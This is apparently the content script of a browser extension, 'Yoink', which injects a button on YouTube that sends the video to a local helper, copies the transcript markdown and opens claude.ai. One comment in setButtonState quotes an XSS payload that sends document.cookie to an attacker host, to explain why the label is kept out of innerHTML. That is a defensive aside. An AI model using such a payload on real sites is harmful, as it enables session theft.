// Yoink — content script.
// Injects a Yoink button under the YouTube player (alongside Like / Share /
// Download) that POSTs the current video URL to the local helper server,
// copies the returned markdown to the clipboard, and opens claude.ai in a
// new tab.
//
// Network/storage logic lives in lib/extract.js (exposed as window.STC) and
// is shared with background.js.

(() => {
  "use strict";

  const BTN_CLASS = "stc-yt-injected-button";
  const BTN_ID = "stc-yt-send-to-claude";
  const ANCHOR_SELECTORS = [
    "ytd-watch-metadata #top-level-buttons-computed",
    "#top-level-buttons-computed",
    "ytd-watch-metadata #actions-inner",
    "ytd-watch-metadata #actions",
    "#actions-inner",
    "#actions",
  ];
  const SHORTS_ANCHOR_SELECTORS = [
    "ytd-reel-video-renderer[is-active] #actions",
    "ytd-reel-video-renderer[is-active] ytd-reel-player-overlay-renderer #actions",
    "ytd-shorts #actions",
    "#shorts-container #actions",
  ];

  // ---- Styles (scoped via the unique class prefix) ----------------------
  const STYLE_ID = "stc-yt-styles";
  const DOT_CLASS = "stc-yt-status-dot";
  function injectStyles() {
    if (document.getElementById(STYLE_ID)) return;
    const style = document.createElement("style");
    style.id = STYLE_ID;
    style.textContent = `
      .${BTN_CLASS} {
        display: inline-flex;
        align-items: center;
        gap: 6px;
        height: 36px;
        padding: 0 16px;
        margin-left: 8px;
        border: none;
        border-radius: 18px;
        background: var(--yt-spec-badge-chip-background, rgba(255,255,255,0.1));
        color: var(--yt-spec-text-primary, #fff);
        font-family: "Roboto", "Arial", sans-serif;
        font-size: 14px;
        font-weight: 500;
        line-height: 36px;
        cursor: pointer;
        white-space: nowrap;
        transition: background-color 0.12s ease, box-shadow 0.18s ease;
      }
      .${BTN_CLASS}:hover { background: rgba(255,255,255,0.2); }
      .${BTN_CLASS}:active { background: rgba(255,255,255,0.28); }
      .${BTN_CLASS}[disabled] { opacity: 0.7; cursor: progress; }
      .${BTN_CLASS}.stc-yt-error { background: rgba(217,87,87,0.25); color: #ffd9d9; }
      .${BTN_CLASS}.stc-yt-success { background: rgba(87,217,131,0.25); color: #d9ffe7; }

      /* Live server status — an 8px dot to the left of the label. */
      .${BTN_CLASS} .${DOT_CLASS} {
        width: 8px;
        height: 8px;
        border-radius: 50%;
        flex-shrink: 0;
        background: #888;
        transition: background-color 0.18s ease, box-shadow 0.18s ease;
      }
      .${BTN_CLASS}.yoink-status-online { /* base style; dot turns green */ }
      .${BTN_CLASS}.yoink-status-online:hover {
        box-shadow: 0 0 0 2px rgba(234, 88, 12, 0.35);
      }
      .${BTN_CLASS}.yoink-status-online .${DOT_CLASS} {
        background: #57d983;
        box-shadow: 0 0 6px rgba(87,217,131,0.55);
      }
      .${BTN_CLASS}.yoink-status-offline .${DOT_CLASS} {
        background: #f59e0b;
        box-shadow: 0 0 6px rgba(245,158,11,0.55);
      }
      .${BTN_CLASS}.yoink-status-checking .${DOT_CLASS} {
        background: #888;
        animation: stc-yt-pulse 1.4s ease-in-out infinite;
      }
      .${BTN_CLASS}.yoink-status-checking { cursor: progress; }
      /* One-shot transition flash when state actually changes. */
      .${BTN_CLASS} .${DOT_CLASS}.stc-yt-flash {
        animation: stc-yt-dot-flash 0.55s ease-out;
      }
      @keyframes stc-yt-pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.35; }
      }
      @keyframes stc-yt-dot-flash {
        0% { transform: scale(1); }
        45% { transform: scale(1.7); }
        100% { transform: scale(1); }
      }

      .${BTN_CLASS} .stc-yt-icon { width: 16px; height: 16px; flex-shrink: 0; }
      .${BTN_CLASS} .stc-yt-spinner {
        width: 14px; height: 14px;
        border: 2px solid rgba(255,255,255,0.3);
        border-top-color: currentColor;
        border-radius: 50%;
        animation: stc-yt-spin 0.7s linear infinite;
      }
      @keyframes stc-yt-spin { to { transform: rotate(360deg); } }
      .${BTN_CLASS}.stc-yt-shorts {
        margin: 8px 0 0 0;
        width: 72px;
        justify-content: center;
        padding: 0 10px;
      }
    `;
    document.head.appendChild(style);
  }

  const ICON_SVG = `
    <svg class="stc-yt-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
      <path d="M12 2 L14.2 9.8 L22 12 L14.2 14.2 L12 22 L9.8 14.2 L2 12 L9.8 9.8 Z"
            fill="currentColor"/>
    </svg>
  `;
  const DOT_SVG = `<span class="${DOT_CLASS}" aria-hidden="true"></span>`;

  function setButtonState(btn, state, label) {
    btn.classList.remove("stc-yt-error", "stc-yt-success");
    if (state === "error") btn.classList.add("stc-yt-error");
    if (state === "success") btn.classList.add("stc-yt-success");
    // Build button contents without ever putting `label` into innerHTML.
    // `label` flows from activeSession.name (chrome.storage, user-controlled
    // via the popup's session-name input) into this function. Interpolating
    // it into innerHTML would let a session named e.g.
    //   <img src=x onerror="fetch('//attacker/'+document.cookie)">
    // execute script in the YouTube page origin. Build the static chrome
    // via innerHTML on a throwaway container (constants only), then append
    // the label as a textContent span.
    btn.replaceChildren();
    const chromeWrap = document.createElement("span");
    if (state === "working") {
      btn.disabled = true;
      chromeWrap.innerHTML = `<span class="stc-yt-spinner"></span>`;
    } else {
      // Only re-enable when not in the "checking" status (which gates clicks).
      btn.disabled = serverStatus === "checking";
      chromeWrap.innerHTML = `${DOT_SVG}${ICON_SVG}`;
    }
    while (chromeWrap.firstChild) btn.appendChild(chromeWrap.firstChild);
    const labelEl = document.createElement("span");
    labelEl.textContent = label;
    btn.appendChild(labelEl);
  }

  function resetButtonAfter(btn, ms) {
    setTimeout(() => setButtonState(btn, "default", defaultLabel()), ms);
  }

  function notify(title, message) {
    try {
      chrome.runtime.sendMessage({ type: "notify", title, message });
    } catch (e) {
      console.warn("[Yoink] notify failed", e);
    }
  }

  function openTab(url) {
    try {
      chrome.runtime.sendMessage({ type: "openTab", url });
    } catch (e) {
      console.warn("[Yoink] openTab failed", e);
    }
  }

  // Throttled — prevents tab spam if the user mashes Yoink while the server
  // is still offline. 5s window resets per page load.
  let _lastSetupOpen = 0;
  function openSetupOffline() {
    const now = Date.now();
    if (now - _lastSetupOpen < 5000) return;
    _lastSetupOpen = now;
    try {
      openTab(chrome.runtime.getURL("setup.html?source=offline"));
    } catch (e) {
      console.warn("[Yoink] openSetupOffline failed", e);
    }
  }

  // ---- Live server status ------------------------------------------------
  // Visible signal next to the button label so the user knows whether a
  // click will yoink (online) or pop the setup guide (offline).
  const STATUS_POLL_MS = 10_000;
  let serverStatus = "checking"; // "checking" | "online" | "offline"
  let statusTimer = null;
  let statusInflight = false;

  function applyStatusToButton(btn) {
    if (!btn) return;
    // Mid-yoink — don't clobber the working state. Status applies when the
    // post-yoink reset puts the button back into default mode.
    if (btn.querySelector(".stc-yt-spinner")) return;
    btn.classList.remove("yoink-status-online", "yoink-status-offline", "yoink-status-checking");
    btn.classList.add(`yoink-status-${serverStatus}`);
    if (serverStatus === "online") {
      btn.title = "Extract transcript + screenshots and open Claude";
      btn.disabled = false;
    } else if (serverStatus === "offline") {
      btn.title = "Yoink server offline — click to start";
      btn.disabled = false;
    } else {
      btn.title = "Checking Yoink status...";
      btn.disabled = true;
    }
  }

  function flashDot(btn) {
    const dot = btn && btn.querySelector(`.${DOT_CLASS}`);
    if (!dot) return;
    dot.classList.remove("stc-yt-flash");
    // Re-trigger the animation by forcing a reflow, then re-adding the class.
    void dot.offsetWidth;
    dot.classList.add("stc-yt-flash");
  }

  function setServerStatus(next) {
    if (serverStatus === next) return;
    const prev = serverStatus;
    serverStatus = next;
    const btn = document.getElementById(BTN_ID);
    if (btn) {
      applyStatusToButton(btn);
      // Flash on real online↔offline transitions, not on the initial
      // checking→online or checking→offline reveal.
      if (prev !== "checking") flashDot(btn);
    }
  }

  async function pollStatus() {
    if (statusInflight) return;
    statusInflight = true;
    try {
      // Proxy through the SW: direct loopback fetches from a YouTube content
      // script can be intercepted by Chrome tracking protection or AV web
      // shields, which would paint the button "offline" even when the
      // server is responding.
      const res = await new Promise((resolve) => {
        try {
          chrome.runtime.sendMessage({ type: "stcPing" }, (r) => {
            if (chrome.runtime.lastError) return resolve(null);
            resolve(r || null);
          });
        } catch { resolve(null); }
      });
      setServerStatus(res && res.ok ? "online" : "offline");
    } catch {
      setServerStatus("offline");
    } finally {
      statusInflight = false;
    }
  }

  function startStatusPolling() {
    stopStatusPolling();
    pollStatus(); // immediate
    statusTimer = setInterval(pollStatus, STATUS_POLL_MS);
  }
  function stopStatusPolling() {
    if (statusTimer) {
      clearInterval(statusTimer);
      statusTimer = null;
    }
  }

  document.addEventListener("visibilitychange", () => {
    if (document.hidden) {
      stopStatusPolling();
    } else {
      // Fire an immediate check on resume so a server we missed coming back
      // online doesn't make the user wait the full 10s.
      startStatusPolling();
    }
  });

  // ---- Active session awareness -----------------------------------------
  let activeSession = null;

  function getActiveFromStorage() {
    return new Promise((resolve) => {
      try {
        chrome.storage.local.get({ active_session: null }, (items) => {
          resolve(items.active_session || null);
        });
      } catch { resolve(null); }
    });
  }

  function defaultLabel() {
    return activeSession ? `Add to session: ${activeSession.name || activeSession.id}` : "Yoink";
  }

  function refreshDefaultLabel() {
    const btn = document.getElementById(BTN_ID);
    if (!btn || btn.disabled) return;
    setButtonState(btn, "default", defaultLabel());
  }

  chrome.storage.onChanged.addListener((changes, area) => {
    if (area === "local" && changes.active_session) {
      activeSession = changes.active_session.newValue || null;
      refreshDefaultLabel();
    }
  });

  // ---- Click handler ----------------------------------------------------
  function normalizedCurrentVideoUrl() {
    return STC.normalizeYouTubeUrl(window.location.href);
  }

  function isSupportedVideoPage() {
    return !!normalizedCurrentVideoUrl();
  }

  function isShortsPage() {
    try {
      return new URL(window.location.href).pathname.startsWith("/shorts/");
    } catch {
      return false;
    }
  }

  async function onClick(btn) {
    const url = normalizedCurrentVideoUrl();
    if (!url) return;

    // Gate by live server status: don't even attempt yoink while the helper
    // is down — pop the setup guide instead. The "checking" state is
    // disabled at the button level so this branch usually isn't reached.
    if (serverStatus === "checking") return;
    if (serverStatus === "offline") {
      notify("Yoink isn't running yet", "Opening setup guide...");
      openSetupOffline();
      return;
    }

    activeSession = await getActiveFromStorage(); // freshen in case popup just changed it
    const interval = await STC.getInterval();

    if (activeSession && activeSession.id) {
      return runSessionAdd(btn, url, interval);
    }
    return runExtract(btn, url, interval);
  }

  async function runExtract(btn, url, interval) {
    setButtonState(btn, "working", "Yoinking...");

    let data;
    try {
      data = await STC.postExtractViaBg(url, interval);
    } catch (e) {
      console.error("[Yoink] server unreachable", e);
      setButtonState(btn, "error", "Yoink server offline");
      btn.title = "Open the Yoink setup guide to start the helper.";
      notify("Yoink isn't running yet", "Opening setup guide...");
      openSetupOffline();
      resetButtonAfter(btn, 5000);
      return;
    }

    if (!data || !data.ok) {
      const msg = STC.friendlyError(data && data.error);
      setButtonState(btn, "error", "Yoink failed");
      btn.title = msg;
      notify("Yoink failed", msg);
      resetButtonAfter(btn, 5000);
      return;
    }

    // Sprint 3: Smart Screenshot Picker intercept. Default off keeps v1
    // behavior byte-identical. When enabled, we hand the corpus off to the
    // popup via chrome.storage.local instead of clipboard + Claude tab.
    if (await _useScreenshotPicker()) {
      await STC.stashPickerCorpus(data);
      notify("Yoink ready",
             "Click the Yoink icon to pick which screenshots to include.");
      setButtonState(btn, "success", "Pick screenshots →");
      btn.title = `Saved to: ${data.folder}. Click the Yoink icon to finish.`;
      resetButtonAfter(btn, 5000);
      return;
    }

    // Prefer the multimodal paste version (transcript + base64-embedded
    // screenshots) so a single Ctrl+V delivers both into Claude/ChatGPT.
    // The file version (yoink_md) is the dev-mode fallback when Pillow
    // wasn't bundled or paste generation failed.
    const clipboardText = data.corpus_md_paste || data.yoink_md;
    let copied = false;
    try {
      await navigator.clipboard.writeText(clipboardText);
      copied = true;
    } catch (e) {
      console.warn("[Yoink] clipboard API failed, falling back", e);
      try {
        const ta = document.createElement("textarea");
        ta.value = clipboardText;
        ta.style.position = "fixed";
        ta.style.left = "-9999px";
        document.body.appendChild(ta);
        ta.select();
        copied = document.execCommand("copy");
        document.body.removeChild(ta);
      } catch (e2) {
        console.error("[Yoink] clipboard fallback failed", e2);
      }
    }

    openTab("https://claude.ai/new");

    // Same shared helper used by the SW queue path. First successful yoink
    // (whether triggered here or through the right-click menu) gets the
    // CTA copy; subsequent yoinks fall back to the topic-aware copy.
    const message = await STC.buildYoinkedMessage(data, copied);
    notify("Yoinked!", message);

    setButtonState(btn, "success", "Yoinked ✓");
    btn.title = `Saved to: ${data.folder}`;
    resetButtonAfter(btn, 3000);
  }

  async function _useScreenshotPicker() {
    try {
      const res = await STC.getSettings();
      return !!(res && res.ok && res.settings &&
                res.settings.smart_screenshot_picker_enabled === true);
    } catch (e) {
      console.warn("[Yoink] settings fetch failed, picker disabled", e);
      return false;
    }
  }

  async function runSessionAdd(btn, url, interval) {
    const sessionName = activeSession.name || activeSession.id;
    setButtonState(btn, "working", `Adding to ${sessionName}...`);

    let data;
    try {
      data = await STC.addToSessionViaBg(activeSession.id, url, interval);
    } catch (e) {
      console.error("[Yoink] server unreachable", e);
      setButtonState(btn, "error", "Yoink server offline");
      btn.title = "Open the Yoink setup guide to start the helper.";
      notify("Yoink isn't running yet", "Opening setup guide...");
      openSetupOffline();
      resetButtonAfter(btn, 5000);
      return;
    }

    if (!data || !data.ok) {
      const msg = STC.friendlyError(data && data.error);
      setButtonState(btn, "error", "Yoink failed");
      btn.title = msg;
      notify("Yoink failed", msg);
      resetButtonAfter(btn, 5000);
      return;
    }

    notify("Added to session",
           `${sessionName} · ${data.video_count} video${data.video_count === 1 ? "" : "s"} so far. ` +
           `End the session in the popup to send to Claude or ChatGPT.`);

    setButtonState(btn, "success", `Added (${data.video_count})`);
    btn.title = `Saved to: ${data.folder}`;
    resetButtonAfter(btn, 3000);
  }

  // ---- Inject -----------------------------------------------------------
  function findAnchor() {
    const selectors = isShortsPage()
      ? SHORTS_ANCHOR_SELECTORS.concat(ANCHOR_SELECTORS)
      : ANCHOR_SELECTORS;
    for (const sel of selectors) {
      const el = document.querySelector(sel);
      if (el) return el;
    }
    return null;
  }

  function injectButton() {
    if (!isSupportedVideoPage()) return false;
    const anchor = findAnchor();
    const existing = document.getElementById(BTN_ID);
    if (existing) {
      existing.classList.toggle("stc-yt-shorts", isShortsPage());
      if (anchor && existing.parentElement !== anchor) anchor.appendChild(existing);
      return true;
    }
    if (!anchor) return false;

    injectStyles();

    const btn = document.createElement("button");
    btn.id = BTN_ID;
    btn.className = BTN_CLASS;
    if (isShortsPage()) btn.classList.add("stc-yt-shorts");
    btn.type = "button";
    setButtonState(btn, "default", defaultLabel());
    applyStatusToButton(btn);
    btn.addEventListener("click", (ev) => {
      ev.preventDefault();
      ev.stopPropagation();
      onClick(btn);
    });

    anchor.appendChild(btn);
    // Now that the button exists, fetch the latest active-session state and
    // re-label if needed.
    getActiveFromStorage().then((s) => {
      activeSession = s;
      refreshDefaultLabel();
    });
    // If the setup page handed us a video to auto-yoink, consume the flag.
    maybeAutoYoink(btn).catch((e) => console.warn("[Yoink] auto_yoink failed", e));
    return true;
  }

  // ---- Auto-yoink handoff from setup.html -------------------------------
  // The setup page writes {auto_yoink: {videoId, ts}} to local storage and
  // opens the YouTube URL in a new tab. We trigger the button on the first
  // injection on the matching video, then atomically clear the flag so a
  // page refresh or a different tab doesn't re-fire it.
  const AUTO_YOINK_TTL_MS = 60_000;
  function currentVideoId() {
    return STC.extractVideoId(window.location.href);
  }
  async function maybeAutoYoink(btn) {
    const stored = await new Promise((r) => {
      try {
        chrome.storage.local.get({ auto_yoink: null }, (i) => r(i.auto_yoink));
      } catch { r(null); }
    });
    if (!stored || !stored.videoId) return;
    if (Date.now() - (stored.ts || 0) > AUTO_YOINK_TTL_MS) {
      try { chrome.storage.local.remove("auto_yoink"); } catch { /* ignore */ }
      return;
    }
    if (currentVideoId() !== stored.videoId) return;

    // Wait for live status to settle so the click isn't swallowed by the
    // "checking" gate on a freshly-loaded YouTube tab.
    if (serverStatus === "checking") {
      try { await pollStatus(); } catch { /* ignore */ }
    }

    // Clear before clicking so a concurrent injection (mutation observer +
    // retry loop both fire) can't double-trigger.
    await new Promise((r) => {
      try { chrome.storage.local.remove("auto_yoink", r); } catch { r(); }
    });

    btn.click();
  }

  function tryInjectWithRetries() {
    let tries = 0;
    const maxTries = 20;
    const interval = setInterval(() => {
      tries += 1;
      if (injectButton() || tries >= maxTries) clearInterval(interval);
    }, 500);
  }

  window.addEventListener("yt-navigate-finish", () => {
    setTimeout(tryInjectWithRetries, 250);
  });

  const observer = new MutationObserver(() => {
    if (!document.getElementById(BTN_ID)) injectButton();
  });
  observer.observe(document.body, { childList: true, subtree: true });

  tryInjectWithRetries();
  // Kick off /health polling so the button has a real status before the
  // user has time to click. Pause/resume is wired via visibilitychange.
  startStatusPolling();
})();
